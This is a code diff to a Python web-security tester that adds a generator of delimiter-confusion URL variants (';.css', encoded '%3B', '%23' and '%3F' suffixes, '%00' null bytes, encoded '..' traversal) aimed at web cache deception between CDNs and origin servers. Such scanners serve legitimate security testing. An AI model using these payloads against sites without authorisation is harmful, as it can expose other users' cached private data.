@@ -59,29 +59,79 @@ class NormalizationTester:
         parsed = urlparse(url)
         path = parsed.path
         variants = []
-        
+
         # Path-based variants (existing logic)
         if path and path != "/":
             # Slashes
             if '/' in path:
                 variants.append(url.replace('/', '%2F'))
-                variants.append(url.replace('/', '%252F')) # Double encoded
-                # variants.append(url.replace('/', '\u2044')) # Unicode fraction slash - risky for python client?
-            
+                variants.append(url.replace('/', '%252F'))  # Double encoded
+
             # Dots
             if '.' in path:
-                 variants.append(url.replace('.', '%2E'))
-            
+                variants.append(url.replace('.', '%2E'))
+
             # Case mismatch (path)
             variants.append(url.upper())
-            
+
             # Matrix params (semicolon)
-            if not ';' in path:
+            if ';' not in path:
                 variants.append(f"{parsed.scheme}://{parsed.netloc}{path};param=1?{parsed.query}")
-        
-        # Query parameter variants (NEW)
+
+        # Query parameter variants
         query_variants = self._generate_query_param_variants(url)
         variants.extend(query_variants)
+
+        return variants
+
+    def _generate_delimiter_confusion_variants(self, url: str) -> List[str]:
+        """
+        Generate URL variants that exploit path delimiter parsing differences
+        between CDN/cache servers and origin servers.
+
+        Based on 2024 research showing CDNs and origins interpret path components
+        differently when encountering semicolons, encoded chars, and other delimiters.
+        """
+        parsed = urlparse(url)
+        path = parsed.path or "/"
+        scheme_host = f"{parsed.scheme}://{parsed.netloc}"
+        query = f"?{parsed.query}" if parsed.query else ""
+        variants = []
+
+        # Only generate if we have a non-trivial path
+        if path == "/" or not path:
+            return variants
+
+        base_path = path.rstrip("/")
+
+        # Semicolon-based delimiter confusion
+        # CDN may treat /path;.css as a static .css file (cacheable by default)
+        # Origin may strip the semicolon segment and serve the original dynamic path
+        variants.append(f"{scheme_host}{base_path};.css{query}")
+        variants.append(f"{scheme_host}{base_path};.js{query}")
+        variants.append(f"{scheme_host}{base_path};version=1{query}")
+        variants.append(f"{scheme_host}{base_path};param=1.css{query}")
+
+        # Encoded delimiter confusion
+        # %3B = semicolon, %23 = hash, %3F = question mark
+        variants.append(f"{scheme_host}{base_path}%3B.css{query}")
+        variants.append(f"{scheme_host}{base_path}%23.js{query}")
+        variants.append(f"{scheme_host}{base_path}%3F.png{query}")
+
+        # Null byte path termination
+        # Some CDNs normalize %00 out while computing cache key; origins may reject or
+        # interpret the path up to the null byte differently
+        variants.append(f"{scheme_host}{base_path}%00.css{query}")
+        variants.append(f"{scheme_host}{base_path}%00.js{query}")
+
+        # Non-standard path separators
+        # Tilde and exclamation are not standard separators but some frameworks handle them
+        variants.append(f"{scheme_host}{base_path}~.css{query}")
+
+        # Encoded path traversal variants (beyond the existing %2F coverage)
+        # %2E%2E = ".." — CDN may normalize, origin may process differently
+        variants.append(f"{scheme_host}{base_path}/%2e%2e/cache.css{query}")
+        variants.append(f"{scheme_host}{base_path}/%252e%252e/cache.js{query}")
 
         return variants
     
